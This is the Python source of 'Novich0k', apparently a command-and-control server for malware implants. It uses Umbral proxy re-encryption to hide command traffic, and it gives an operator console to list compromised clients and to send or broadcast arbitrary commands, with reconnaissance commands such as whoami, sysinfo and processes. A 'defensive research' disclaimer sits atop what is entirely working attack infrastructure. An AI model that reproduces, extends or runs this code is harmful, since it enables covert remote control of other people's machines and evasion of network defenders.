#!/usr/bin/env python3
# Novich0k - Umbral PRE-Based C2 Server Implementation
# For defensive security research purposes only

import socket
import threading
import time
import json
import base64
import os
import sys
import argparse
import logging
from datetime import datetime

# Import Umbral PRE libraries - adapted for your installation
from umbral import SecretKey, PublicKey, Signer
from umbral.curve import SECP256K1

# In Umbral 0.3.0, these are the correct imports
from umbral.pre import encrypt, decrypt_original, decrypt_reencrypted, reencrypt
from umbral.pre import generate_kfrags  # Directly import generate_kfrags

# Import local modules
try:
    from modules.umbral_pre import UmbralPRECore
    from modules.commands import CommandExecutor
    from modules.utils import get_timestamp, key_fingerprint, setup_environment, check_dependencies
except ImportError:
    # For standalone use, implement core functionality directly
    pass

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("novich0k_server.log")
    ]
)

logger = logging.getLogger("Novich0k-Server")

# Helper function for key fingerprint if not available
def key_fingerprint(key_bytes):
    """Generate a fingerprint for a key"""
    import hashlib
    return hashlib.sha256(key_bytes).hexdigest()[:8]

class C2Server:
    """Command and Control server with Umbral PRE capabilities"""
    
    def __init__(self, host='127.0.0.1', port=8888):
        """Initialize the C2 server"""
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Client connections
        self.clients = {}
        self.proxies = {}
        
        # Initialize Umbral PRE
        self.params = SECP256K1
        
        # Generate server keys - adapted for your installation
        self.private_key = SecretKey.random()
        self.public_key = self.private_key.public_key()
        
        # Generate signing keys - adapted for your installation
        self.signing_key = SecretKey.random()
        self.verifying_key = self.signing_key.public_key()
        self.signer = Signer(self.signing_key)
        
        # Number of kfrags to generate (N)
        self.num_kfrags = 10
        
        # Threshold of kfrags needed for successful decryption (M of N)
        self.threshold = 8
        
        # Flag to determine if we use proxy re-encryption
        self.use_proxy = False
        
        logger.info(f"C2 Server initialized on {host}:{port}")
        logger.info(f"Server public key fingerprint: {key_fingerprint(bytes(self.public_key))}")
    
    def start(self):
        """Start the C2 server"""
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            logger.info(f"C2 Server listening on {self.host}:{self.port}")
            
            # Start a thread to accept connections
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Start the interactive command console
            self.command_loop()
            
        except Exception as e:
            logger.error(f"Error starting server: {e}")
            sys.exit(1)
    
    def accept_connections(self):
        """Accept incoming connections from clients and proxies"""
        while True:
            try:
                client_socket, address = self.server_socket.accept()
                logger.info(f"New connection from {address[0]}:{address[1]}")
                
                # Initialize as unknown entity
                client_id = f"{address[0]}:{address[1]}"
                
                # Start a thread to identify and handle this connection
                handler_thread = threading.Thread(
                    target=self.identify_connection,
                    args=(client_socket, client_id, address)
                )
                handler_thread.daemon = True
                handler_thread.start()
                
            except Exception as e:
                logger.error(f"Error accepting connection: {e}")
    
    def identify_connection(self, client_socket, client_id, address):
        """Identify whether the connection is a client or proxy"""
        try:
            # First message will identify the entity type
            data = client_socket.recv(8192)
            if not data:
                logger.warning(f"No data received from {client_id}")
                client_socket.close()
                return
            
            message = json.loads(data.decode())
            
            # Check if this is a proxy registration
            if message.get('proxy_registration', False):
                self.handle_proxy_registration(client_socket, client_id, address, message)
            else:
                # Assume it's a client connection
                self.handle_client(client_socket, client_id, address, message)
                
        except json.JSONDecodeError:
            logger.error(f"Invalid JSON from {client_id}")
            client_socket.close()
        except Exception as e:
            logger.error(f"Error identifying connection {client_id}: {e}")
            client_socket.close()
    
    def handle_proxy_registration(self, proxy_socket, proxy_id, address, message):
        """Handle registration of a proxy server"""
        try:
            logger.info(f"Proxy registration from {proxy_id}")
            
            # Extract proxy's public key - adapted for your installation
            try:
                proxy_pubkey_bytes = base64.b64decode(message['public_key'])
                proxy_pubkey = PublicKey.from_bytes(proxy_pubkey_bytes)
            except Exception as e:
                logger.error(f"Error deserializing proxy public key: {e}")
                raise ValueError("Invalid proxy public key format")
            
            # Store proxy information
            self.proxies[proxy_id] = {
                'socket': proxy_socket,
                'address': address,
                'public_key': proxy_pubkey,
                'last_seen': time.time()
            }
            
            # Generate key fragments for this proxy - adapted for Umbral 0.3.0
            kfrags = generate_kfrags(
                delegating_sk=self.private_key,
                receiving_pk=proxy_pubkey,
                signer=self.signer,
                threshold=self.threshold,
                shares=self.num_kfrags
            )
            
            # Serialize the key fragments - in Umbral 0.3.0, kfrags are already bytes
            serialized_kfrags = []
            for kfrag in kfrags:
                # kfrag is already bytes in 0.3.0
                serialized_kfrags.append(base64.b64encode(kfrag).decode())
            
            # Send the key fragments to the proxy
            response = {
                'status': 'registered',
                'kfrags': serialized_kfrags,
                'delegating_pk': base64.b64encode(bytes(self.public_key)).decode(),
                'threshold': self.threshold
            }
            
            proxy_socket.send(json.dumps(response).encode())
            logger.info(f"Proxy {proxy_id} registered successfully")
            
            # Start a thread to listen for updates from this proxy
            proxy_thread = threading.Thread(
                target=self.handle_proxy_updates,
                args=(proxy_socket, proxy_id)
            )
            proxy_thread.daemon = True
            proxy_thread.start()
            
        except Exception as e:
            logger.error(f"Error registering proxy {proxy_id}: {e}")
            proxy_socket.close()
            if proxy_id in self.proxies:
                del self.proxies[proxy_id]
    
    def handle_proxy_updates(self, proxy_socket, proxy_id):
        """Handle updates from a proxy server"""
        try:
            while True:
                data = proxy_socket.recv(8192)
                if not data:
                    logger.info(f"Proxy {proxy_id} disconnected")
                    break
                
                message = json.loads(data.decode())
                self.proxies[proxy_id]['last_seen'] = time.time()
                
                # Handle proxy reporting a new client connection
                if 'new_client' in message:
                    logger.info(f"Proxy {proxy_id} reported new client: {message['new_client']}")
                
                # Handle other proxy updates as needed
                
        except Exception as e:
            logger.error(f"Error handling proxy updates for {proxy_id}: {e}")
        finally:
            proxy_socket.close()
            if proxy_id in self.proxies:
                del self.proxies[proxy_id]
            logger.info(f"Proxy {proxy_id} removed")
    
    def handle_client(self, client_socket, client_id, address, message):
        """Handle a client connection"""
        try:
            # Extract client's public key - adapted for your installation
            if 'public_key' in message:
                client_public_key_bytes = message['public_key']
                try:
                    client_public_key = PublicKey.from_bytes(
                        base64.b64decode(client_public_key_bytes)
                    )
                except Exception as e:
                    logger.error(f"Error deserializing client public key: {e}")
                    raise ValueError("Invalid client public key format")
                
                # Check for client ID in the message
                if 'client_id' in message:
                    client_id = message['client_id']
                
                # Store client information
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': address,
                    'public_key': client_public_key,
                    'last_seen': time.time()
                }
                
                # Send server's public key to client - adapted for your installation
                response = {
                    'status': 'connected',
                    'public_key': base64.b64encode(bytes(self.public_key)).decode()
                }
                
                client_socket.send(json.dumps(response).encode())
                logger.info(f"Client {client_id} connected successfully")
                print(f"\n[+] New client connected: {client_id}")
                if self.use_proxy:
                    print(f"    Using proxy re-encryption: Yes (threshold {self.threshold} of {self.num_kfrags})")
                else:
                    print(f"    Using proxy re-encryption: No")
                    
                print("\nC2> ", end="", flush=True)
                
                # Start a thread to handle client communications
                client_thread = threading.Thread(
                    target=self.handle_client_communications,
                    args=(client_socket, client_id)
                )
                client_thread.daemon = True
                client_thread.start()
            else:
                logger.error(f"Client {client_id} did not provide a public key")
                client_socket.close()
                
        except Exception as e:
            logger.error(f"Error handling client {client_id}: {e}")
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
    
    def handle_client_communications(self, client_socket, client_id):
        """Handle ongoing communications with a client"""
        try:
            while True:
                data = client_socket.recv(8192)
                if not data:
                    logger.info(f"Client {client_id} disconnected")
                    break
                
                try:
                    message = json.loads(data.decode())
                    self.clients[client_id]['last_seen'] = time.time()
                    
                    # If this is a response to a command
                    if 'response' in message:
                        encrypted_data = message['response']
                        
                        try:
                            # Decode the capsule - adapted for your installation
                            # In Umbral 0.3.0, we just get the capsule bytes
                            capsule_bytes = base64.b64decode(encrypted_data['capsule'])
                            
                            # Decode the ciphertext
                            ciphertext = base64.b64decode(encrypted_data['ciphertext'])
                            
                            # Decrypt the response - for Umbral 0.3.0
                            plaintext = decrypt_original(
                                ciphertext=ciphertext,
                                capsule=capsule_bytes,  # In 0.3.0, decrypt_original expects bytes
                                decrypting_sk=self.private_key
                            )
                            
                            response_json = json.loads(plaintext.decode())
                            logger.info(f"Response from {client_id}: {response_json}")
                            
                            # Print the response to the console
                            print(f"\n[*] Response from {client_id}:")
                            self.print_response(response_json['response'])
                            print(f"\nC2:{client_id}> ", end="", flush=True)
                        except Exception as e:
                            logger.error(f"Error decrypting response from {client_id}: {e}")
                            print(f"\n[!] Error decrypting response from {client_id}: {e}")
                    
                except Exception as e:
                    logger.error(f"Error processing message from {client_id}: {e}")
                
        except Exception as e:
            logger.error(f"Error in client communications for {client_id}: {e}")
        finally:
            # Clean up when client disconnects
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
            logger.info(f"Client {client_id} removed")
            print(f"\n[-] Client {client_id} disconnected")
            print("\nC2> ", end="", flush=True)
    
    def print_response(self, response):
        """Pretty print the response data"""
        if isinstance(response, dict):
            # Format dictionary responses
            for key, value in response.items():
                if isinstance(value, dict):
                    print(f"  {key}:")
                    for k, v in value.items():
                        print(f"    {k}: {v}")
                elif isinstance(value, list):
                    print(f"  {key}:")
                    for item in value:
                        if isinstance(item, dict):
                            for k, v in item.items():
                                print(f"    {k}: {v}")
                            print()
                        else:
                            print(f"    {item}")
                else:
                    print(f"  {key}: {value}")
        elif isinstance(response, list):
            # Format list responses
            for item in response:
                if isinstance(item, dict):
                    for k, v in item.items():
                        print(f"  {k}: {v}")
                    print()
                else:
                    print(f"  {item}")
        else:
            # Format string or other responses
            print(f"  {response}")
    
    def command_loop(self):
        """Interactive command console for the C2 server"""
        print("\n--- Novich0k C2 Server Command Interface ---")
        print("Available commands:")
        print("  list           - List all connected clients")
        print("  select <id>    - Select a client by ID")
        print("  broadcast      - Send command to all clients")
        print("  proxy <on/off> - Toggle proxy re-encryption")
        print("  help           - Show this help message")
        print("  exit           - Shut down the server")
        print("--------------------------------------------")
        
        while True:
            try:
                command = input("\nC2> ").strip()
                
                if command == "list":
                    self.list_clients()
                
                elif command.startswith("select "):
                    parts = command.split(" ", 1)
                    if len(parts) < 2:
                        print("[!] Please specify a client ID")
                        continue
                    
                    client_id = parts[1].strip()
                    if client_id in self.clients:
                        self.interact_with_client(client_id)
                    else:
                        print(f"[!] Client {client_id} not found")
                
                elif command == "broadcast":
                    self.broadcast_command()
                
                elif command.startswith("proxy "):
                    parts = command.split(" ", 1)
                    if len(parts) < 2:
                        print("[!] Please specify on or off")
                        continue
                    
                    if parts[1].lower() == "on":
                        if not self.proxies:
                            print("[!] No proxy servers registered. Cannot enable proxy re-encryption.")
                            continue
                            
                        self.use_proxy = True
                        print("[*] Proxy re-encryption enabled")
                        print(f"[*] Using threshold {self.threshold} of {self.num_kfrags}")
                        logger.info("Proxy re-encryption enabled")
                    elif parts[1].lower() == "off":
                        self.use_proxy = False
                        print("[*] Proxy re-encryption disabled")
                        logger.info("Proxy re-encryption disabled")
                    else:
                        print("[!] Invalid option. Use 'on' or 'off'")
                
                elif command == "help":
                    print("\nAvailable commands:")
                    print("  list           - List all connected clients")
                    print("  select <id>    - Select a client by ID")
                    print("  broadcast      - Send command to all clients")
                    print("  proxy <on/off> - Toggle proxy re-encryption")
                    print("  help           - Show this help message")
                    print("  exit           - Shut down the server")
                
                elif command == "exit":
                    print("[*] Shutting down server...")
                    logger.info("Shutting down server")
                    self.server_socket.close()
                    sys.exit(0)
                
                else:
                    print("[!] Unknown command. Type 'help' for available commands.")
            
            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                logger.info("Server interrupted by user")
                break
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                print(f"[!] Error: {e}")
    
    def list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print("[!] No clients connected")
            return
        
        print("\nConnected clients:")
        print("-------------------")
        for i, (client_id, data) in enumerate(self.clients.items(), 1):
            addr = data['address']
            last_seen = time.strftime("%H:%M:%S", time.localtime(data['last_seen']))
            print(f"{i}. [{last_seen}] {client_id} ({addr[0]}:{addr[1]})")
        print("-------------------")
        
        if self.proxies:
            print("\nRegistered proxies:")
            print("-------------------")
            for i, (proxy_id, data) in enumerate(self.proxies.items(), 1):
                addr = data['address']
                last_seen = time.strftime("%H:%M:%S", time.localtime(data['last_seen']))
                print(f"{i}. [{last_seen}] {proxy_id} ({addr[0]}:{addr[1]})")
            print("-------------------")
    
    def interact_with_client(self, client_id):
        """Send commands to a specific client"""
        print(f"[*] Interacting with client {client_id}")
        print("[*] Type 'back' to return to main menu")
        print("[*] Type 'help' for available commands")
        
        available_commands = {
            "sysinfo": "Get system information",
            "whoami": "Get current user",
            "ping": "Test connectivity",
            "uptime": "Get system uptime",
            "echo <message>": "Echo a message",
            "sleep <seconds>": "Sleep for specified seconds",
            "processes": "List running processes",
            "interfaces": "List network interfaces"
        }
        
        while True:
            try:
                cmd = input(f"C2:{client_id}> ").strip()
                
                if cmd.lower() == "back":
                    break
                
                if cmd.lower() == "help":
                    print("\nAvailable commands:")
                    for command_name, description in available_commands.items():
                        print(f"  {command_name.ljust(20)} - {description}")
                    print("  back                  - Return to main menu")
                    print("  help                  - Show this help message")
                    continue
                
                if not cmd:
                    continue
                
                # Send the command to the client
                self.send_command_to_client(client_id, cmd)
                
            except KeyboardInterrupt:
                print("\n[*] Returning to main menu")
                break
            except Exception as e:
                logger.error(f"Error interacting with client: {e}")
                print(f"[!] Error: {e}")
    
    def send_command_to_client(self, client_id, command):
        """Send a command to a specific client"""
        if client_id not in self.clients:
            print(f"[!] Client {client_id} not found")
            return
        
        client = self.clients[client_id]
        client_socket = client['socket']
        client_public_key = client['public_key']
        
        try:
            # Prepare command data
            cmd_data = {
                'id': str(time.time()),
                'command': command,
                'timestamp': datetime.now().isoformat()
            }
            
            # Serialize to JSON regardless of proxy mode
            plaintext = json.dumps(cmd_data).encode()
            
            if self.use_proxy and self.proxies:
                try:
                    print("[*] Using Umbral proxy re-encryption...")
                    
                    # Step 1: Encrypt message for the server itself
                    ciphertext, capsule = encrypt(self.public_key, plaintext)
                    
                    # In Umbral 0.3.0, capsule is already bytes so we use it directly
                    message = {
                        'command': True,
                        'use_proxy': True,
                        'encrypted_data': {
                            'ciphertext': base64.b64encode(ciphertext).decode(),
                            'capsule': base64.b64encode(capsule).decode(),  # capsule is already bytes
                        },
                        'delegating_pk': base64.b64encode(bytes(self.public_key)).decode(),
                        'threshold': self.threshold
                    }
                except Exception as e:
                    logger.error(f"Error encrypting command for proxy: {e}")
                    print(f"[!] Error encrypting command for proxy: {e}")
                    return
                
            else:
                try:
                    # Direct encryption for client
                    ciphertext, capsule = encrypt(client_public_key, plaintext)
                    
                    # In Umbral 0.3.0, capsule is already bytes so we use it directly
                    message = {
                        'command': True,
                        'encrypted_data': {
                            'ciphertext': base64.b64encode(ciphertext).decode(),
                            'capsule': base64.b64encode(capsule).decode(),  # capsule is already bytes
                        }
                    }
                except Exception as e:
                    logger.error(f"Error encrypting command for client: {e}")
                    print(f"[!] Error encrypting command for client: {e}")
                    return
            
            # Send the message
            client_socket.send(json.dumps(message).encode())
            logger.info(f"Command sent to {client_id}: {command}")
            print(f"[+] Command sent to {client_id}")
            
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            print(f"[!] Error sending command: {e}")
    
    def broadcast_command(self):
        """Send a command to all connected clients"""
        if not self.clients:
            print("[!] No clients connected")
            return
        
        try:
            command = input("Enter command to broadcast: ").strip()
            if not command:
                return
            
            for client_id in list(self.clients.keys()):
                self.send_command_to_client(client_id, command)
            
            print(f"[+] Command broadcasted to {len(self.clients)} clients")
            
        except Exception as e:
            logger.error(f"Error broadcasting command: {e}")
            print(f"[!] Error broadcasting command: {e}")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Novich0k - Umbral PRE-Based C2 Server")
    parser.add_argument("--host", default="127.0.0.1",
                        help="Host to bind to")
    parser.add_argument("--port", type=int, default=8888,
                        help="Port to bind to")
    parser.add_argument("--setup", action="store_true",
                        help="Install required dependencies")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging")
    
    args = parser.parse_args()
    
    # Set debug logging if requested
    if args.debug:
        logger.setLevel(logging.DEBUG)
    
    if args.setup:
        try:
            from modules.utils import setup_environment
            if setup_environment():
                print("[+] Setup complete")
            else:
                print("[!] Setup failed")
            return
        except ImportError:
            print("[!] Setup module not found")
            return
    
    # Check dependencies
    try:
        from modules.utils import check_dependencies
        missing = check_dependencies()
        if missing:
            print(f"[!] Missing dependencies: {', '.join(missing)}")
            print("[*] Install dependencies with: python umbral_server.py --setup")
            return
    except:
        pass
    
    try:
        server = C2Server(args.host, args.port)
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Server interrupted by user. Exiting...")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()